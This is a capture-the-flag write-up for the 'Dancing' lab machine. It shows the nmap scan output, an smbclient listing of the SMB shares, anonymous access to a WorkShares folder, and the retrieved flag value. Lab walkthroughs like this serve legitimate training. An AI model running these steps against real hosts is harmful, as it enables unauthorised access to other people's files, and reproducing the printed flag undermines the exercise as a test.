# Dancing

#startingpoint #smb #reconnaissance #anonymous/guestaccess 

`nmap` scan shows SMB running on ports 135/445, specifically the `microsoft-ds` service:

```
$ nmap -sC -sV -T4 10.129.240.89
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 17:31 EDT
Nmap scan report for 10.129.240.89
Host is up (0.034s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 3h57m43s
| smb2-time: 
|   date: 2024-08-31T01:29:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
```

Listing the available shares with `smbclient`, we see there are **four shares**:

```
$ smbclient -L 10.129.240.89
...
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```

Accessing `WorkShares`, we see two directories, `Amy.J` and `James.P`, with the latter containing `flag.txt` which is retrieved with the `get` command:

```
$ smbclient \\\\10.129.240.89\\WorkShares
```

Reading the `flag.txt` file:

```
$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```